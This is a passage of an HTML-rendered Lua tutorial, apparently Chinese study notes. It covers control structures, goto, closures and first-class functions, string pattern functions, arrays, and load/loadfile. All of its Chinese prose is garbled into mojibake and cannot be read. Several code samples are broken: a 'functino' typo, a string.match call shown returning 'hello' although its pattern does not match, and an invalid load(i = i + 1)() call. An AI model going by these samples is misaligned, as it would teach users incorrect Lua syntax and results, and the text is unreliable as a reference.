id="8-2-æ§åˆ¶ç»“æ„"><a href="#8-2-æ§åˆ¶ç»“æ„" class="headerlink" title="8.2 æ§åˆ¶ç»“æ„"></a>8.2 æ§åˆ¶ç»“æ„</h2><p>æ‰€æœ‰çš„æ§åˆ¶ç»“æ„è¯­æ³•ä¸Šéƒ½æœ‰ä¸€ä¸ªæ˜¾å¼çš„ç»ˆç»“ç¬¦: <code>end</code></p><p><mark>æ³¨æ„</mark>, Lua è¯­è¨€å°†æ‰€æœ‰ä¸æ˜¯ <code>false</code> å’Œ <code>nil</code> çš„å€¼å½“ä½œçœŸ.</p><h3 id="8-2-1-if-then-else"><a href="#8-2-1-if-then-else" class="headerlink" title="8.2.1 if then else"></a>8.2.1 if then else</h3><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-keyword">if</span> op == <span class="hljs-string">&quot;+&quot;</span> <span class="hljs-keyword">then</span><br>    r = a + b<br><span class="hljs-keyword">elseif</span> op == <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-keyword">then</span><br>    r = a - b<br><span class="hljs-keyword">elseif</span> op == <span class="hljs-string">&quot;*&quot;</span> <span class="hljs-keyword">then</span><br>    r = a*b<br><span class="hljs-keyword">elseif</span> op == <span class="hljs-string">&quot;/&quot;</span> <span class="hljs-keyword">then</span><br>    r = a/b<br><span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">error</span>(<span class="hljs-string">&quot;invalid operation&quot;</span>)<br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><p><code>then</code> è¡¨è¾¾å¼å¯ä»¥ä½œä¸ºæ¡ä»¶è¡¨è¾¾å¼çš„ç»ˆæ­¢æ ‡è®°.</p><p><code>error</code> å‡½æ•°ç”¨äºæŠ¥é”™.</p><p>Lua ä¸æ”¯æŒ <code>switch</code> è¯­å¥.</p><h3 id="8-2-2-while"><a href="#8-2-2-while" class="headerlink" title="8.2.2 while"></a>8.2.2 while</h3><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-keyword">local</span> i = <span class="hljs-number">1</span><br><span class="hljs-keyword">while</span> a[i] <span class="hljs-keyword">do</span><br>    <span class="hljs-built_in">print</span>(a[i])<br>    i = i + <span class="hljs-number">1</span><br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><h3 id="8-2-3-repeat"><a href="#8-2-3-repeat" class="headerlink" title="8.2.3 repeat"></a>8.2.3 repeat</h3><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-keyword">local</span> line <br><span class="hljs-keyword">repeat</span><br>    line = <span class="hljs-built_in">io</span>.<span class="hljs-built_in">read</span>()<br><span class="hljs-keyword">until</span> line ~= <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-built_in">print</span>(line)<br></code></pre></td></tr></table></figure><h3 id="8-2-4-æ•°å€¼å‹-for"><a href="#8-2-4-æ•°å€¼å‹-for" class="headerlink" title="8.2.4 æ•°å€¼å‹ for"></a>8.2.4 æ•°å€¼å‹ for</h3><p>ä¸¤ç§ç±»å‹çš„ <code>for</code> è¯­å¥:</p><ul><li>æ•°å€¼å‹ (numerical)</li><li>æ³›å‹ (generic)</li></ul><p>æ•°å€¼å‹å¦‚:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-keyword">for</span> var = exp1, exp2, exp3 <span class="hljs-keyword">do</span><br>    something<br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><p><code>var</code> çš„å€¼ä» <code>exp1</code> å˜åŒ–åˆ° <code>exp2</code>, <code>exp3</code> æ˜¯æ­¥é•¿ (step) å¯é€‰, é»˜è®¤ä¸º 1.</p><p>ä¸è®¾ä¸Šé™, ä½¿ç”¨ <code>math.huge</code>:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-keyword">for</span> i = <span class="hljs-number">1</span>, <span class="hljs-built_in">math</span>.<span class="hljs-built_in">huge</span> <span class="hljs-keyword">do</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-number">0.3</span>*i^<span class="hljs-number">3</span> - <span class="hljs-number">20</span>*i^<span class="hljs-number">2</span> - <span class="hljs-number">500</span> &gt;= <span class="hljs-number">0</span>) <span class="hljs-keyword">then</span><br>        <span class="hljs-built_in">print</span>(i)<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„æ§åˆ¶å˜é‡ <code>i</code> æ˜¯å±€éƒ¨å˜é‡.</p><p><mark>æ³¨æ„</mark>, ä¸è¦æ”¹å˜æ§åˆ¶å˜é‡çš„å€¼, éšæ„æ”¹å˜æ§åˆ¶å˜é‡çš„å€¼å¯èƒ½äº§ç”Ÿä¸å¯é¢„çŸ¥çš„ç»“æœ.</p><h3 id="8-2-5-æ³›å‹-for"><a href="#8-2-5-æ³›å‹-for" class="headerlink" title="8.2.5 æ³›å‹ for"></a>8.2.5 æ³›å‹ for</h3><p>æ³›å‹ <code>for</code> éå†è¿­ä»£å‡½æ•°è¿”å›çš„æ‰€æœ‰å€¼. (å¦‚ <code>pairs</code>, <code>ipairs</code>, <code>io.lines</code>)</p><p>æ³›å‹ <code>for</code> å¯ä»¥ä½¿ç”¨å¤šä¸ªå˜é‡, è¿™äº›å˜é‡åœ¨æ¯æ¬¡å¾ªç¯æ—¶éƒ½ä¼šæ›´æ–°, <mark>å½“ç¬¬ä¸€ä¸ªå˜é‡å˜ä¸º <code>nil</code> æ—¶</mark> å¾ªç¯ç»ˆæ­¢.</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs lua">t = &#123;<span class="hljs-number">10</span>, <span class="hljs-built_in">print</span>, x = <span class="hljs-number">12</span>, k = <span class="hljs-string">&quot;hi&quot;</span>&#125;<br><span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> <span class="hljs-built_in">pairs</span>(t) <span class="hljs-keyword">do</span> <br>    <span class="hljs-built_in">print</span>(k, v)<br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><h2 id="8-3-break-return-å’Œ-goto"><a href="#8-3-break-return-å’Œ-goto" class="headerlink" title="8.3 break, return å’Œ goto"></a>8.3 break, return å’Œ goto</h2><p>æ‰€æœ‰å‡½æ•°çš„æœ€åéƒ½æœ‰ä¸€ä¸ªéšå«çš„ <code>return</code>.</p><p><code>goto</code> çš„æ ‡ç­¾å½¢å¼å¦‚ <code>::name::</code>. (å¤æ‚è¯­æ³•ç”¨äºé†’ç›®æ ‡è¯†)</p><p><code>goto</code> ä¸èƒ½è·³è½¬åˆ°å‡½æ•°å¤–, ä¹Ÿä¸èƒ½è·³è½¬åˆ°å±€éƒ¨å˜é‡çš„ä½œç”¨åŸŸ.</p><p><mark>å±€éƒ¨å˜é‡çš„ä½œç”¨åŸŸç»ˆæ­¢äº</mark>å£°æ˜å˜é‡çš„ä»£ç å—ä¸­çš„æœ€åä¸€ä¸ªæœ‰æ•ˆ (non-void) è¯­å¥å¤„, æ ‡ç­¾è¢«è®¤ä¸ºæ˜¯æ— æ•ˆ (void) è¯­å¥.</p><h1 id="9-é—­åŒ…"><a href="#9-é—­åŒ…" class="headerlink" title="9 é—­åŒ…"></a>9 é—­åŒ…</h1><p>ä¸€ä¸ªæ¦‚å¿µ, Lua çš„å‡½æ•°æ˜¯éµå¾ª <mark>è¯æ³•å®šç•Œ (lexicalscoping) çš„ç¬¬ä¸€ç±»å€¼ (first-classvalue)</mark> </p><p><mark>ç¬¬ä¸€ç±»å€¼</mark> æŒ‡ Lua ä¸­çš„å‡½æ•°ä¸å…¶ä»–å¸¸è§çš„ç±»å‹çš„å€¼å…·æœ‰åŒç­‰æƒé™:</p><ul><li>å¯ä»¥å°†å‡½æ•°ä¿å­˜åœ¨å˜é‡æˆ–è¡¨ä¸­</li><li>å¯ä»¥å°†å‡½æ•°ä½œä¸ºå‚æ•°ä¼ é€’ç»™å…¶ä»–å‡½æ•°</li><li>å¯ä»¥å°†å‡½æ•°ä½œä¸ºå…¶ä»–å‡½æ•°çš„è¿”å›å€¼</li></ul><p><mark>è¯æ³•å®šç•Œ</mark> æŒ‡ Lua ä¸­çš„å‡½æ•°å¯ä»¥è®¿é—®åŒ…å«å…¶è‡ªèº«çš„å¤–éƒ¨å‡½æ•°ä¸­çš„å˜é‡. å¦‚å‡½æ•° B åŒ…å«å‡½æ•° A, é‚£ä¹ˆå‡½æ•° A å¯ä»¥è®¿é—®å‡½æ•° B çš„æ‰€æœ‰å±€éƒ¨å˜é‡.</p><h2 id="9-1-ç¬¬ä¸€ç±»å€¼"><a href="#9-1-ç¬¬ä¸€ç±»å€¼" class="headerlink" title="9.1 ç¬¬ä¸€ç±»å€¼"></a>9.1 ç¬¬ä¸€ç±»å€¼</h2><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lua">a = &#123;p = <span class="hljs-built_in">print</span>&#125;     <span class="hljs-comment">-- &#x27;a.p&#x27; æŒ‡å‘ &#x27;print&#x27; å‡½æ•°</span><br>a.p(<span class="hljs-string">&quot;Hello World&quot;</span>)  <span class="hljs-comment">-- Hello World</span><br></code></pre></td></tr></table></figure><p>å‡½æ•°çš„å®šä¹‰å¯ä»¥ç”±:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">foo</span><span class="hljs-params">(x)</span></span> <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>*x<br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><p>å†™æˆ:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs lua">foo = <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-params">(x)</span></span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>*x<br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><p><mark>æ³¨æ„</mark>, åœ¨ Lua ä¸­æ‰€æœ‰å‡½æ•°éƒ½æ˜¯åŒ¿åçš„ (anonynous), å³æ²¡æœ‰åå­—, å½“è®¨è®ºå‡½æ•°åå¦‚ <code>print</code> æ—¶, å®é™…ä¸ŠæŒ‡çš„æ˜¯ä¿å­˜è¯¥å‡½æ•°çš„å˜é‡.</p><p><mark>é«˜é˜¶å‡½æ•°</mark>, ä»¥å¦ä¸€ä¸ªå‡½æ•°ä½œä¸ºå‚æ•°, å¦‚ <code>sort</code>:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-built_in">table</span>.<span class="hljs-built_in">sort</span>(network, <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-params">(a,b)</span></span> <span class="hljs-keyword">return</span> (a.name &gt; b.name) <span class="hljs-keyword">end</span>)<br></code></pre></td></tr></table></figure><h2 id="9-2-éå…¨å±€å‡½æ•°"><a href="#9-2-éå…¨å±€å‡½æ•°" class="headerlink" title="9.2 éå…¨å±€å‡½æ•°"></a>9.2 éå…¨å±€å‡½æ•°</h2><p>è¡¨å­—æ®µä¸­å­˜å‚¨å‡½æ•°, æœ‰å¾ˆå¤šä¸­å†™æ³•:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs lua">lib = &#123;&#125;<br>lib.foo = <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-params">(x,y)</span></span> <span class="hljs-keyword">return</span> x + y <span class="hljs-keyword">end</span><br>lib.goo = <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-params">(x,y)</span></span> <span class="hljs-keyword">return</span> x - y <span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><p>æˆ–:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs lua">lib = &#123;<br>    foo = <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-params">(x,y)</span></span> <span class="hljs-keyword">return</span> x + y <span class="hljs-keyword">end</span>,<br>    goo = <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-params">(x,y)</span></span> <span class="hljs-keyword">return</span> x - y <span class="hljs-keyword">end</span><br>&#125;<br></code></pre></td></tr></table></figure><p>æˆ–:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs lua">lib = &#123;&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">lib.foo</span> <span class="hljs-params">(x,y)</span></span> <span class="hljs-keyword">return</span> x + y <span class="hljs-keyword">end</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">lib.goo</span> <span class="hljs-params">(x,y)</span></span> <span class="hljs-keyword">return</span> x - y <span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><p><mark>å½“æŠŠä¸€ä¸ªå‡½æ•°å­˜å‚¨åˆ°å±€éƒ¨å˜é‡æ—¶</mark>, å°±å¾—åˆ°äº†ä¸€ä¸ªå±€éƒ¨å‡½æ•° (local function).</p><p>å®šä¹‰å±€éƒ¨å‡½æ•°:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-keyword">local</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">f</span><span class="hljs-params">(params)</span></span><br>    body<br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><p>å…¶å±•å¼€ä¸º:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-keyword">local</span> f; f = functino (params)<br>    body<br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><h2 id="9-3-è¯æ³•å®šç•Œ"><a href="#9-3-è¯æ³•å®šç•Œ" class="headerlink" title="9.3 è¯æ³•å®šç•Œ"></a>9.3 è¯æ³•å®šç•Œ</h2><p><mark>é—­åŒ… (closure)</mark>. å³ä¸€ä¸ªæŒæœ‰å¤–éƒ¨ç¯å¢ƒå˜é‡çš„å‡½æ•°å°±æ˜¯é—­åŒ….</p><p>ç”±äºå‡½æ•°å¯ä»¥è¢«ä¿å­˜åœ¨æ™®é€šå˜é‡ä¸­, å› æ­¤ Lua è¯­è¨€ä¸­å¯ä»¥è½»æ¾åœ°é‡å®šä¹‰å‡½æ•°:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-keyword">do</span> <br>    <span class="hljs-keyword">local</span> oldSin = <span class="hljs-built_in">math</span>.<span class="hljs-built_in">sin</span><br>    <span class="hljs-keyword">local</span> k = <span class="hljs-built_in">math</span>.<span class="hljs-built_in">pi</span> / <span class="hljs-number">180</span><br>    <span class="hljs-built_in">math</span>.<span class="hljs-built_in">sin</span> = <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-params">(x)</span></span><br>        <span class="hljs-keyword">return</span> oldSin(x * k)<br>    <span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><h1 id="10-æ¨¡å¼åŒ¹é…"><a href="#10-æ¨¡å¼åŒ¹é…" class="headerlink" title="10 æ¨¡å¼åŒ¹é…"></a>10 æ¨¡å¼åŒ¹é…</h1><h2 id="10-1-æ¨¡å¼åŒ¹é…ç›¸å…³å‡½æ•°"><a href="#10-1-æ¨¡å¼åŒ¹é…ç›¸å…³å‡½æ•°" class="headerlink" title="10.1 æ¨¡å¼åŒ¹é…ç›¸å…³å‡½æ•°"></a>10.1 æ¨¡å¼åŒ¹é…ç›¸å…³å‡½æ•°</h2><p>å­—ç¬¦ä¸²æ ‡å‡†åº“æä¾›çš„ 4 ä¸ªå‡½æ•°:</p><ul><li><code>find</code></li><li><code>gsub</code> (global substitute)</li><li><code>match</code></li><li><code>gmatch</code> (global match)</li></ul><h3 id="10-1-1-string-find"><a href="#10-1-1-string-find" class="headerlink" title="10.1.1 string.find"></a>10.1.1 string.find</h3><p>ä¸¤ä¸ªå‚æ•°:</p><ul><li>å­—ç¬¦ä¸²</li><li>è¦åŒ¹é…çš„å€¼</li></ul><p>ä¸¤ä¸ªå¯é€‰å‚æ•°:</p><ul><li>ç¬¬ä¸‰ä¸ª, æ•´æ•°, ä»é‚£é‡Œå¼€å§‹çš„ç´¢å¼•</li><li>ç¬¬å››ä¸ª, å¸ƒå°”å€¼, æ˜¯å¦è¿›è¡Œç®€å•æœç´¢</li></ul><p>åŒ¹é…æˆåŠŸè¿”å›ä¸¤ä¸ªå€¼:</p><ul><li>æ¨¡å¼å¼€å§‹ä½ç½®çš„ç´¢å¼•</li><li>æ¨¡å¼ç»“æŸä½ç½®çš„ç´¢å¼•</li></ul><p>æ²¡æ‰¾åˆ°ä»»ä½•åŒ¹é…, è¿”å› <code>nil</code>.</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lua">s = <span class="hljs-string">&quot;hello world&quot;</span><br>i, j = <span class="hljs-built_in">string</span>.<span class="hljs-built_in">find</span>(s, <span class="hljs-string">&quot;hello&quot;</span>)<br></code></pre></td></tr></table></figure><h3 id="10-1-2-string-match"><a href="#10-1-2-string-match" class="headerlink" title="10.1.2 string.match"></a>10.1.2 string.match</h3><p>å’Œ <code>string.find</code> ç±»ä¼¼, ä½†æ˜¯è¿”å›å­—ç¬¦ä¸².</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-built_in">print</span>(<span class="hljs-built_in">string</span>.<span class="hljs-built_in">match</span>(<span class="hljs-string">&quot;hello world&quot;</span>, <span class="hljs-string">&quot;hellow&quot;</span>))    <span class="hljs-comment">--&gt; hello</span><br></code></pre></td></tr></table></figure><h3 id="10-1-3-string-gsub"><a href="#10-1-3-string-gsub" class="headerlink" title="10.1.3 string.gsub"></a>10.1.3 string.gsub</h3><p>3 ä¸ªå¿…é€‰å‚æ•°:</p><ul><li>ç›®æ ‡å­—ç¬¦ä¸²</li><li>æ¨¡å¼</li><li>æ›¿æ¢å­—ç¬¦ä¸²</li></ul><p>1 ä¸ªå¯é€‰å‚æ•°:</p><ul><li>æ›¿æ¢æ¬¡æ•°</li></ul><p>ä¸¤ä¸ªè¿”å›å€¼:</p><ul><li>æ›¿æ¢åçš„å­—ç¬¦ä¸²</li><li>æ›¿æ¢çš„æ¬¡æ•°</li></ul><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lua">s = <span class="hljs-built_in">string</span>.<span class="hljs-built_in">gsub</span>(<span class="hljs-string">&quot;Lua is cute&quot;</span>, <span class="hljs-string">&quot;cute&quot;</span>, <span class="hljs-string">&quot;great&quot;</span>)<br><span class="hljs-built_in">print</span>(s)    <span class="hljs-comment">--&gt; Lua is great</span><br></code></pre></td></tr></table></figure><h3 id="10-1-4-string-gmatch"><a href="#10-1-4-string-gmatch" class="headerlink" title="10.1.4 string.gmatch"></a>10.1.4 string.gmatch</h3><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs lua">s = <span class="hljs-string">&quot;some string&quot;</span><br>words = &#123;&#125;<br><span class="hljs-keyword">for</span> w <span class="hljs-keyword">in</span> <span class="hljs-built_in">string</span>.<span class="hljs-built_in">gmatch</span>(s, <span class="hljs-string">&quot;%a+&quot;</span>) <span class="hljs-keyword">do</span><br>    words[#words + <span class="hljs-number">1</span>] = w<br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><h1 id="12-æ—¥æœŸå’Œæ—¶é—´"><a href="#12-æ—¥æœŸå’Œæ—¶é—´" class="headerlink" title="12 æ—¥æœŸå’Œæ—¶é—´"></a>12 æ—¥æœŸå’Œæ—¶é—´</h1><p>Lua æ ‡å‡†åº“æä¾›äº†ä¸¤ä¸ªç”¨äºæ“ä½œæ—¥æœŸå’Œæ—¶é—´çš„å‡½æ•°. å’Œ C æ ‡å‡†åº“ä¸­æä¾›ç›¸åŒçš„åŠŸèƒ½.</p><h1 id="14-æ•°æ®ç»“æ„"><a href="#14-æ•°æ®ç»“æ„" class="headerlink" title="14 æ•°æ®ç»“æ„"></a>14 æ•°æ®ç»“æ„</h1><p>Lua ä¸­çš„è¡¨å¹¶ä¸æ˜¯ä¸€ç§æ•°æ®ç»“æ„, å®ƒä»¬æ˜¯å…¶ä»–æ•°æ®ç»“æ„çš„åŸºç¡€.</p><h2 id="14-1-æ•°ç»„"><a href="#14-1-æ•°ç»„" class="headerlink" title="14.1 æ•°ç»„"></a>14.1 æ•°ç»„</h2><p>å¦‚:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-keyword">local</span> a = &#123;&#125;<br><span class="hljs-keyword">for</span> i = <span class="hljs-number">1</span>, <span class="hljs-number">10</span> <span class="hljs-keyword">do</span><br>    a[i] = <span class="hljs-number">0</span><br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><p>æˆ–:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua">squares = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">9</span>, <span class="hljs-number">16</span>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œå…¶å®å¯ä»¥æŠŠç¬¬ä¸€ä¸ªç´¢å¼•å€¼æ”¹ä¸º <code>0</code>, ä½†æ˜¯è¿™æ ·çš„è¯ <code>#</code> ä»¥åŠå…¶ä»–æ ‡å‡†åº“ä¼šå‡ºé—®é¢˜. </p><h1 id="16-ç¼–è¯‘-æ‰§è¡Œå’Œé”™è¯¯"><a href="#16-ç¼–è¯‘-æ‰§è¡Œå’Œé”™è¯¯" class="headerlink" title="16 ç¼–è¯‘, æ‰§è¡Œå’Œé”™è¯¯"></a>16 ç¼–è¯‘, æ‰§è¡Œå’Œé”™è¯¯</h1><p>è™½ç„¶ Lua æ˜¯è§£é‡Šå‹è¯­è¨€ (interpreted language), ä½†å…¶æ€»æ˜¯åœ¨è¿è¡Œä»£ç å‰å…ˆé¢„ç¼–è¯‘ (precompile) æºç ä¸ºä¸­é—´ä»£ç .</p><h2 id="16-1-ç¼–è¯‘"><a href="#16-1-ç¼–è¯‘" class="headerlink" title="16.1 ç¼–è¯‘"></a>16.1 ç¼–è¯‘</h2><p><code>dofile</code> æ˜¯ä¸€ä¸ªè¾…åŠ©å‡½æ•°, <code>loadfile</code> å®Œæˆæ ¸å¿ƒå·¥ä½œ, å…¶ä»æ–‡ä»¶ä¸­åŠ è½½ Lua ä»£ç æ®µ, ç„¶å®ƒä¸ä¼šè¿è¡Œä»£ç , åªæ˜¯ç¼–è¯‘, å°†ç¼–è¯‘åçš„ä»£ç æ®µä½œä¸ºä¸€ä¸ªå‡½æ•°è¿”å›.</p><p>å¯ä»¥è®¤ä¸º:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">dofile</span><span class="hljs-params">(filename)</span></span><br>    <span class="hljs-keyword">local</span> f = <span class="hljs-built_in">assert</span>(<span class="hljs-built_in">loadfile</span>(filename))<br>    <span class="hljs-keyword">return</span> f()<br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><p>å¦‚æœéœ€è¦ <mark>å¤šæ¬¡è¿è¡ŒåŒä¸€ä¸ªæ–‡ä»¶</mark> , åªéœ€è°ƒç”¨ä¸€æ¬¡ loadfile å‡½æ•°åå†å¤šæ¬¡è°ƒç”¨å®ƒçš„è¿”å›ç»“æœå³å¯. (åªç¼–è¯‘äº†ä¸€æ¬¡, å¼€é”€å°)</p><p><code>load</code> å‡½æ•°, ä»ä¸€ä¸ªå­—ç¬¦ä¸²æˆ–å‡½æ•°ä¸­è¯»å–ä»£ç æ®µ:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua">f = <span class="hljs-built_in">load</span>(<span class="hljs-string">&quot;i = i + 1&quot;</span>)<br></code></pre></td></tr></table></figure><p>ä¹‹å, å˜é‡ <code>f</code> å°±ä¼šå˜æˆä¸€ä¸ªè¢«è°ƒç”¨æ—¶æ‰§è¡Œ <code>i = i + 1</code> çš„å‡½æ•°:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs lua">i = <span class="hljs-number">0</span><br>f(); <span class="hljs-built_in">print</span>(i)   <span class="hljs-comment">--&gt; 1</span><br>f(); <span class="hljs-built_in">print</span>(i)   <span class="hljs-comment">--&gt; 2</span><br></code></pre></td></tr></table></figure><p>ä¸è®©å…¶å˜ä¸ºå‡½æ•°, ç›´æ¥è¿è¡Œ, åˆ™åˆ©ç”¨å…¶è¿”å›å€¼:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-built_in">load</span>(i = i + <span class="hljs-number">1</span>)()<br><span class="hljs-comment">-- æœ€å¥½å†™ä¸º</span><br><span class="hljs-built_in">assert</span>(<span class="hljs-built_in">load</span>(s))()<br></code></pre></td></tr></table></figure><p><mark><code>load</code> å‡½æ•°æ€»æ˜¯åœ¨å…¨å±€ç¯å¢ƒä¸­ç¼–è¯‘ä»£ç æ®µ</mark> å¦‚:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs lua">i = <span class="hljs-number">32</span><br><span class="hljs-keyword">local</span> i = <span class="hljs-number">0</span><br>f = <span class="hljs-built_in">load</span>(<span class="hljs-string">&quot;i = i + 1; print(i)&quot;</span>)<br>g = <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-params">()</span></span> i = i + <span class="hljs-number">1</span>; <span class="hljs-built_in">print</span>(i) <span class="hljs-keyword">end</span><br>f()     <span class="hljs-comment">--&gt; 33</span><br>g()     <span class="hljs-comment">--&gt; 1</span><br></code></pre></td></tr></table></figure><p><code>load</code> å‡½æ•°å…¸å‹ç”¨æ³•æ˜¯æ‰§è¡Œå¤–éƒ¨ä»£ç  (ç”¨æˆ·è¾“å…¥çš„ä»£ç ):</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;enter your expression&quot;</span><br><span class="hljs-keyword">local</span> line = <span class="hljs-built_in">io</span>.<span class="hljs-built_in">read</span>()<br><span class="hljs-keyword">local</span> func = <span class="hljs-built_in">assert</span>(<span class="hljs-built_in">load</span>(<span class="hljs-string">&quot;return &quot;</span> .. line))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;the value of your expression is &quot;</span> .. func())<br></code></pre></td></tr></table></figure><p>ä»¥ä¸‹ <code>load</code> ä½¿ç”¨å’Œ <code>loadfile</code> ç­‰ä»·:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua">f = <span class="hljs-built_in">load</span>(<span class="hljs-built_in">io</span>.<span 